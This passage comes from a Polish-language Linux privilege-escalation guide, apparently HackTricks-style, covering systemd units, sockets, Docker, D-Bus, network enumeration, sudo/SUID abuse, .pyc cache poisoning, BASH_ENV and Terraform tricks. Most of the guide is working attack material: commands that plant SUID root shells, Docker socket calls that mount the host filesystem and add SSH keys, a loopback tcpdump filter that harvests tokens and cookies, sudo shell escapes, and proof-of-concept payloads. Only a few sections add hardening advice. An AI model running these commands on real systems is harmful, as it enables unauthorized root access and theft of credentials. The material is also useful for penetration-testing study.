Sprawdź, czy możesz zapisywać do dowolnego pliku `.service`; jeśli tak, **możesz go zmodyfikować**, aby **wykonywał** Twój **backdoor, gdy** usługa jest **uruchamiana**, **restartowana** lub **zatrzymywana** (może być konieczne zaczekanie na ponowne uruchomienie maszyny).\
Na przykład utwórz backdoor wewnątrz pliku .service za pomocą **`ExecStart=/tmp/script.sh`**

### Zapisywalne binaria usług

Pamiętaj, że jeśli masz **uprawnienia zapisu do binariów wykonywanych przez usługi**, możesz zmienić je na backdoory, aby po ponownym wykonaniu usług backdoory zostały wykonane.

### systemd PATH - Ścieżki względne

Możesz wyświetlić PATH używany przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli okaże się, że możesz **zapisywać** w dowolnym folderze ze ścieżki, możesz być w stanie **eskalować uprawnienia**. Musisz wyszukać **ścieżki względne używane w plikach konfiguracji usług**, takich jak:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie utwórz **wykonywalny** plik o **tej samej nazwie co binarny plik ze ścieżki względnej** w zapisywalnym przez Ciebie folderze systemd PATH, a gdy usługa otrzyma polecenie wykonania podatnej akcji (**Start**, **Stop**, **Reload**), zostanie wykonany Twój **backdoor** (nieuprzywilejowani użytkownicy zwykle nie mogą uruchamiać/zatrzymywać usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Więcej informacji o usługach znajdziesz w `man systemd.service`.**

## **Timers**

**Timery** to pliki jednostek systemd, których nazwa kończy się na `**.timer**` i które kontrolują pliki `**.service**` lub zdarzenia. **Timery** mogą być używane jako alternatywa dla crona, ponieważ mają wbudowaną obsługę zdarzeń opartych na czasie kalendarzowym i monotonicznym oraz mogą być uruchamiane asynchronicznie.

Możesz wyliczyć wszystkie timery za pomocą:
```bash
systemctl list-timers --all
```
### Timery z prawem zapisu

Jeśli możesz modyfikować timer, możesz sprawić, aby wykonywał niektóre jednostki systemd.unit (takie jak `.service` lub `.target`)
```bash
Unit=backdoor.service
```
W dokumentacji możesz przeczytać, czym jest jednostka:

> Jednostka aktywowana po upływie tego timera. Argumentem jest nazwa jednostki bez przyrostka „.timer”. Jeśli nie zostanie określona, wartość ta domyślnie wskazuje usługę o tej samej nazwie co jednostka timera, z pominięciem przyrostka. (Zobacz powyżej). Zaleca się, aby nazwa aktywowanej jednostki i nazwa jednostki timera były identyczne, z wyjątkiem przyrostka.

Dlatego aby nadużyć tego uprawnienia, musisz:

- Znaleźć jednostkę systemd (np. `.service`), która **wykonuje zapisywalny plik binarny**
- Znaleźć jednostkę systemd, która **wykonuje ścieżkę względną**, oraz posiadać **uprawnienia do zapisu w systemd PATH** (aby podszyć się pod ten plik wykonywalny)

**Dowiedz się więcej o timerach za pomocą `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer, potrzebujesz uprawnień root i musisz wykonać:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Zwróć uwagę, że **timer** jest **aktywowany** przez utworzenie dowiązania symbolicznego do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) umożliwiają **komunikację między procesami** na tej samej lub różnych maszynach w ramach modeli klient-serwer. Wykorzystują standardowe pliki deskryptorów Unix do komunikacji między komputerami i są konfigurowane za pomocą plików `.socket`.<sup>[[14]](#references)</sup>

Sockets można konfigurować za pomocą plików `.socket`.

**Dowiedz się więcej o sockets za pomocą `man systemd.socket`.** W tym pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje różnią się od siebie, ale ich podsumowanie służy do **wskazania, gdzie socket będzie nasłuchiwać** (ścieżka do pliku socketu AF_UNIX, numer IPv4/6 i/lub port, na którym ma nasłuchiwać itd.)
- `Accept`: Przyjmuje argument typu boolean. Jeśli ma wartość **true**, dla każdego przychodzącego połączenia tworzona jest **instancja service**, a przekazywany jest do niej tylko socket połączenia. Jeśli ma wartość **false**, wszystkie sockets nasłuchujące są **przekazywane do uruchomionego unit service**, a dla wszystkich połączeń tworzony jest tylko jeden unit service. Ta wartość jest ignorowana dla sockets datagramowych i FIFO, w których pojedynczy unit service bezwarunkowo obsługuje cały przychodzący ruch. **Domyślnie ma wartość false**. Ze względów wydajności zaleca się pisanie nowych daemonów wyłącznie w sposób zgodny z `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmują co najmniej jedną linię poleceń, które są **wykonywane odpowiednio przed** lub **po** utworzeniu i powiązaniu nasłuchujących **sockets**/FIFO. Pierwszy token wiersza poleceń musi być bezwzględną nazwą pliku, po której następują argumenty procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane odpowiednio przed** lub **po** zamknięciu i usunięciu nasłuchujących **sockets**/FIFO.
- `Service`: Określa nazwę unitu **service**, który ma zostać **aktywowany** po **przychodzącym ruchu**. To ustawienie jest dozwolone wyłącznie dla sockets z `Accept=no`. Domyślnie jest to service o takiej samej nazwie jak socket (z zamienionym rozszerzeniem). W większości przypadków użycie tej opcji nie powinno być konieczne.

### Writable .socket files

Jeśli znajdziesz **writable** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś takiego: `ExecStartPre=/home/kali/sys/backdoor`, a backdoor zostanie wykonany przed utworzeniem socketu. Dlatego **prawdopodobnie trzeba będzie poczekać na ponowne uruchomienie maszyny.**\
_Należy pamiętać, że system musi korzystać z konfiguracji tego pliku socketu, w przeciwnym razie backdoor nie zostanie wykonany_

### Socket activation + writable unit path (create missing service)

Inną poważną błędną konfiguracją jest:

- unit socket z `Accept=no` i `Service=<name>.service`
- brak wskazanego unitu service
- możliwość zapisu przez atakującego do `/etc/systemd/system` (lub innej ścieżki wyszukiwania unitów)

W takim przypadku atakujący może utworzyć `<name>.service`, a następnie wywołać ruch do socketu, aby systemd załadował i wykonał nowy service jako root.

Szybki przebieg:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Zapisywalne sockety

Jeśli **zidentyfikujesz dowolny zapisywalny socket** (_mówimy teraz o Unix Sockets, a nie o plikach konfiguracyjnych `.socket`_), możesz **komunikować się** z tym socketem i być może wykorzystać podatność.

### Enumerowanie Unix Sockets
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład wykorzystania:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Gniazda HTTP

Pamiętaj, że mogą istnieć **gniazda nasłuchujące na żądania HTTP** (_nie mam na myśli plików .socket, ale pliki działające jako gniazda unix_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Jeśli socket **odpowiada na żądanie HTTP**, możesz się z nim **komunikować** i być może **wykorzystać pewną lukę**.

### Zapisywalny socket Docker

Socket Docker, często znajdujący się w `/var/run/docker.sock`, to krytyczny plik, który powinien być odpowiednio zabezpieczony. Domyślnie można go zapisywać jako użytkownik `root` oraz członek grupy `docker`. Posiadanie dostępu do zapisu w tym sockecie może prowadzić do eskalacji uprawnień. Poniżej przedstawiono, jak można to zrobić, a także alternatywne metody na wypadek, gdy Docker CLI nie jest dostępny.

#### **Eskalacja uprawnień za pomocą Docker CLI**

Jeśli masz dostęp do zapisu w sockecie Docker, możesz eskalować uprawnienia za pomocą następujących poleceń:<sup>[[15]](#references)</sup>
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te polecenia pozwalają uruchomić kontener z dostępem na poziomie root do systemu plików hosta.

#### **Bezpośrednie używanie Docker API**

Gdy Docker CLI nie jest dostępny, nadal można nadużyć gniazda Docker, używając surowego HTTP za pośrednictwem gniazda Unix. Najbardziej niezawodny przebieg wygląda następująco:

- utworzenie długotrwałego kontenera pomocniczego z zamontowanym katalogiem głównym hosta za pomocą bind mount
- jego uruchomienie
- utworzenie instancji `exec` wewnątrz tego kontenera pomocniczego
- uruchomienie instancji `exec` i odczytanie danych wyjściowych za pośrednictwem API

**Lista obrazów Docker**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
**Utwórz i uruchom kontener pomocniczy**
```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
"http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
-X POST "http://localhost/v1.47/containers/${HELPER}/start"
```
**Utwórz instancję exec**
```bash
EXEC_ID=$(
curl -s --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
"http://localhost/v1.47/containers/${HELPER}/exec" \
| tr -d '\n' \
| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```
**Uruchom instancję exec i odczytaj dane wyjściowe**
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":true}' \
"http://localhost/v1.47/exec/${EXEC_ID}/start"
```
Ten schemat jest zwykle bardziej niezawodny niż próba ręcznego sterowania `attach` za pomocą `socat` lub `nc -U`. Gdy możesz utworzyć helpera z `/:/host`, możesz użyć dodatkowych instancji `exec` do odczytywania plików takich jak `/host/root/...`, dodawania kluczy SSH w `/host/root/.ssh` lub modyfikowania plików startowych hosta.

### Inne

Pamiętaj, że jeśli masz uprawnienia do zapisu w docker socket, ponieważ **jesteś wewnątrz grupy `docker`**, masz [**więcej sposobów na eskalację uprawnień**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Jeśli [**docker API nasłuchuje na porcie**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising), również możesz być w stanie je skompromitować.

Sprawdź **więcej sposobów na wydostanie się z kontenerów lub wykorzystanie container runtimes do eskalacji uprawnień** tutaj:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Jeśli znajdziesz możliwość użycia polecenia **`ctr`**, przeczytaj poniższą stronę, ponieważ **możesz być w stanie je wykorzystać do eskalacji uprawnień**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Jeśli znajdziesz możliwość użycia polecenia **`runc`**, przeczytaj poniższą stronę, ponieważ **możesz być w stanie je wykorzystać do eskalacji uprawnień**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany **system komunikacji międzyprocesowej (IPC)**, który umożliwia aplikacjom wydajną interakcję i współdzielenie danych. Zaprojektowany z myślą o nowoczesnych systemach Linux, oferuje solidne środowisko dla różnych form komunikacji między aplikacjami.<sup>[[16]](#references)</sup>

System jest wszechstronny i obsługuje podstawowe IPC, usprawniające wymianę danych między procesami, podobnie jak **rozszerzone UNIX domain sockets**. Ponadto umożliwia rozgłaszanie zdarzeń lub sygnałów, ułatwiając bezproblemową integrację między komponentami systemu. Na przykład sygnał od demona Bluetooth o połączeniu przychodzącym może spowodować wyciszenie odtwarzacza muzyki, poprawiając komfort użytkownika. Dodatkowo D-Bus obsługuje system obiektów zdalnych, upraszczając żądania usług i wywoływanie metod między aplikacjami oraz usprawniając procesy, które tradycyjnie były złożone.

D-Bus działa na **modelu allow/deny**, zarządzając uprawnieniami wiadomości (wywołaniami metod, emisją sygnałów itd.) na podstawie łącznego efektu pasujących reguł polityki. Polityki te określają interakcje z magistralą i mogą umożliwiać eskalację uprawnień poprzez wykorzystanie tych uprawnień.

Przykład takiej polityki w `/etc/dbus-1/system.d/wpa_supplicant.conf` przedstawia uprawnienia użytkownika root do posiadania, wysyłania i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy mają zastosowanie uniwersalne, natomiast polityki w kontekście „default” stosują się do wszystkich przypadków, których nie obejmują inne, bardziej szczegółowe polityki.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się tutaj, jak przeprowadzać enumerację i wykorzystywać komunikację D-Bus:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Sieć**

Zawsze interesujące jest przeprowadzenie enumeracji sieci i ustalenie pozycji maszyny.

### Ogólna enumeracja
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Szybka wstępna diagnostyka filtrowania ruchu wychodzącego

Jeśli host może wykonywać polecenia, ale callbacki nie działają, szybko rozdziel filtrowanie DNS, transportu, proxy i routingu:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Otwarte porty

Zawsze sprawdzaj usługi sieciowe działające na maszynie, z którymi nie udało Ci się wcześniej wejść w interakcję przed uzyskaniem do niej dostępu:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Klasyfikuj listenery według celu bindowania:

- `0.0.0.0` / `[::]`: dostępne przez wszystkie lokalne interfejsy.
- `127.0.0.1` / `::1`: dostępne tylko lokalnie (dobrzy kandydaci do tunnelingu/forwardingu).
- Konkretne wewnętrzne adresy IP (np. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): zwykle osiągalne tylko z segmentów wewnętrznych.

### Workflow triage usług dostępnych tylko lokalnie

Po przejęciu hosta usługi nasłuchujące na `127.0.0.1` często po raz pierwszy stają się osiągalne z poziomu Twojej powłoki. Szybki lokalny workflow wygląda następująco:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS jako skaner sieciowy (tryb tylko sieciowy)

Oprócz lokalnych kontroli PE linPEAS może działać jako ukierunkowany skaner sieciowy. Wykorzystuje dostępne pliki binarne w `$PATH` (zwykle `fping`, `ping`, `nc`, `ncat`) i nie instaluje żadnych narzędzi.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Jeśli przekażesz `-d`, `-p` lub `-i` bez `-t`, linPEAS działa jako pure network scanner (pomijając pozostałe kontrole privilege-escalation).

### Sniffing

Sprawdź, czy możesz sniffować ruch. Jeśli tak, możesz być w stanie przechwycić niektóre credentials.
```
timeout 1 tcpdump
```
Szybkie praktyczne sprawdzenia:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) jest szczególnie cenny podczas post-exploitation, ponieważ wiele usług dostępnych wyłącznie wewnętrznie udostępnia tam tokeny/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Przechwyć teraz, przeanalizuj później:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Użytkownicy

### Generic Enumeration

Sprawdź, **kim** jesteś, jakie masz **uprawnienia**, jacy **użytkownicy** znajdują się w systemie, którzy z nich mogą się **logować** oraz którzy mają **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Duży UID

Niektóre wersje Linuxa były podatne na błąd, który pozwala użytkownikom z **UID > INT_MAX** na eskalację uprawnień. Więcej informacji: [tutaj](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [tutaj](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) oraz [tutaj](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Wykorzystaj to** za pomocą: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem jakiejś grupy**, która może nadać Ci uprawnienia root:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy w schowku znajduje się coś interesującego (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka haseł
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Znane hasła

Jeśli **znasz dowolne hasło** w środowisku, **spróbuj zalogować się jako każdy użytkownik**, używając tego hasła.

### Su Brute

Jeśli nie przeszkadza Ci generowanie dużej ilości szumu, a pliki binarne `su` i `timeout` są obecne na komputerze, możesz spróbować przeprowadzić brute-force użytkownika za pomocą [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` również próbuje przeprowadzić brute-force użytkowników.

## Nadużycia zapisywalnego PATH

### $PATH

Jeśli stwierdzisz, że możesz **zapisywać w którymś folderze znajdującym się w $PATH**, możesz być w stanie podnieść uprawnienia, **tworząc backdoor w zapisywalnym folderze** i nadając mu nazwę polecenia, które zostanie wykonane przez innego użytkownika (najlepiej root), a które **nie jest ładowane z folderu znajdującego się wcześniej** niż Twój zapisywalny folder w $PATH.

### SUDO i SUID

Możesz mieć możliwość wykonywania niektórych poleceń za pomocą sudo albo mogą one mieć bit suid. Sprawdź to za pomocą:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają odczytywać i/lub zapisywać pliki, a nawet wykonywać polecenia**.<sup>[[8]](#references)</sup> Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja Sudo może pozwalać użytkownikowi na wykonanie określonego polecenia z uprawnieniami innego użytkownika bez znajomości hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchamiać `vim` jako `root`. Uzyskanie powłoki jest teraz banalne — można dodać klucz SSH do katalogu roota albo wywołać `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ta dyrektywa umożliwia użytkownikowi **ustawienie zmiennej środowiskowej** podczas wykonywania czegoś:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, oparty na maszynie HTB Admirer, był podatny na **PYTHONPATH hijacking**, umożliwiający załadowanie dowolnej biblioteki Pythona podczas wykonywania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Zatruwanie zapisywalnego `__pycache__` / `.pyc` w importach Pythona dozwolonych przez sudo

Jeśli **skrypt Pythona dozwolony przez sudo** importuje moduł, którego katalog pakietu zawiera **zapisywalny `__pycache__`**, możesz być w stanie zastąpić zapisany w pamięci podręcznej plik `.pyc` i uzyskać code execution jako uprzywilejowany użytkownik przy następnym imporcie.<sup>[[30]](#references)</sup>

- Dlaczego to działa:
- CPython przechowuje pamięci podręczne bytecode w `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
- Interpreter weryfikuje **nagłówek** (magic + metadane timestamp/hash powiązane ze źródłem), a następnie wykonuje obiekt code przechowywany za tym nagłówkiem.
- Jeśli możesz **usunąć i ponownie utworzyć** zapisany w pamięci podręcznej plik, ponieważ katalog jest zapisywalny, plik `.pyc` należący do root, ale niezapisywalny, nadal może zostać zastąpiony.
- Typowa ścieżka:
- `sudo -l` pokazuje skrypt lub wrapper Pythona, który możesz uruchomić jako root.
- Ten skrypt importuje lokalny moduł z `/opt/app/`, `/usr/local/lib/...` itd.
- Katalog `__pycache__` importowanego modułu jest zapisywalny przez twojego użytkownika lub przez wszystkich.

Szybka enumeracja:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Jeśli możesz przeanalizować uprzywilejowany skrypt, zidentyfikuj importowane moduły i ich ścieżkę pamięci podręcznej:<sup>[[32]](#references)</sup>
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Proces wykorzystania:

1. Uruchom raz skrypt dozwolony przez sudo, aby Python utworzył prawidłowy plik cache, jeśli jeszcze nie istnieje.
2. Odczytaj pierwsze 16 bajtów z prawidłowego pliku `.pyc` i użyj ich w zatrutym pliku.
3. Skompiluj obiekt kodu payloadu, użyj na nim `marshal.dumps(...)`, usuń oryginalny plik cache i utwórz go ponownie, łącząc oryginalny nagłówek ze złośliwym bytecode'em.
4. Ponownie uruchom skrypt dozwolony przez sudo, aby import wykonał payload jako root.

Ważne uwagi:

- Ponowne użycie oryginalnego nagłówka ma kluczowe znaczenie, ponieważ Python sprawdza metadane cache względem pliku źródłowego, a nie to, czy treść bytecode'u rzeczywiście odpowiada źródłu.
- Jest to szczególnie przydatne, gdy plik źródłowy należy do root i nie można go zapisywać, ale zawierający go katalog `__pycache__` jest zapisywalny.
- Atak zakończy się niepowodzeniem, jeśli uprzywilejowany proces używa `PYTHONDONTWRITEBYTECODE=1`, importuje pliki z lokalizacji o bezpiecznych uprawnieniach lub odbiera uprawnienia zapisu do każdego katalogu w ścieżce importu.

Minimalna forma proof-of-concept:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Upewnij się, że żaden katalog w uprzywilejowanej ścieżce importu Python nie jest zapisywalny przez użytkowników o niskich uprawnieniach, w tym `__pycache__`.
- W przypadku uprzywilejowanych uruchomień rozważ użycie `PYTHONDONTWRITEBYTECODE=1` oraz okresowe sprawdzanie, czy nie występują nieoczekiwane zapisywalne katalogi `__pycache__`.
- Traktuj zapisywalne lokalne moduły Python i zapisywalne katalogi cache w taki sam sposób, jak zapisywalne skrypty powłoki lub shared libraries wykonywane przez root.

### BASH_ENV preserved via sudo env_keep → root shell

Jeśli sudoers zachowuje `BASH_ENV` (np. `Defaults env_keep+="ENV BASH_ENV"`), możesz wykorzystać zachowanie startowe Bash dla powłok non-interactive, aby uruchomić dowolny kod jako root podczas wywoływania dozwolonego polecenia.<sup>[[24]](#references)</sup>

- Dlaczego to działa: W przypadku powłok non-interactive Bash interpretuje `$BASH_ENV` i source’uje wskazany plik przed uruchomieniem docelowego skryptu. Wiele reguł sudo zezwala na uruchamianie skryptu lub wrappera powłoki. Jeśli `BASH_ENV` jest zachowywany przez sudo, Twój plik zostanie zsource’owany z uprawnieniami root.<sup>[[23]](#references)</sup>

- Wymagania:
- Reguła sudo, którą możesz uruchomić (dowolny cel wywołujący `/bin/bash` non-interactive lub dowolny skrypt bash).
- `BASH_ENV` obecny w `env_keep` (sprawdź za pomocą `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Wzmacnianie zabezpieczeń:
- Usuń `BASH_ENV` (oraz `ENV`) z `env_keep`, preferuj `env_reset`.
- Unikaj wrapperów powłoki dla poleceń dozwolonych przez sudo; używaj minimalnych plików binarnych.
- Rozważ logowanie I/O sudo i alerty, gdy używane są zachowane zmienne środowiskowe.

### Terraform via sudo z zachowanym HOME (!env_reset)

Jeśli sudo pozostawia środowisko bez zmian (`!env_reset`), zezwalając jednocześnie na `terraform apply`, wartość `$HOME` pozostaje ustawiona na użytkownika wywołującego. Terraform ładuje wówczas **$HOME/.terraformrc** jako root i respektuje `provider_installation.dev_overrides`.<sup>[[25]](#references)</sup>

- Wskaż wymagany provider na zapisywalny katalog i umieść w nim złośliwy plugin nazwany tak jak provider (np. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform nie przejdzie handshake'u wtyczki Go, ale przed zakończeniem działania wykona payload jako root, pozostawiając powłokę SUID.

### Nadpisywanie TF_VAR + obejście walidacji symlinków

Zmienne Terraform można przekazywać za pomocą zmiennych środowiskowych `TF_VAR_<name>`, które pozostają dostępne, gdy sudo zachowuje środowisko. Słabe mechanizmy walidacji, takie jak `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, można obejść za pomocą symlinków:<sup>[[25]](#references)</sup>
```bash
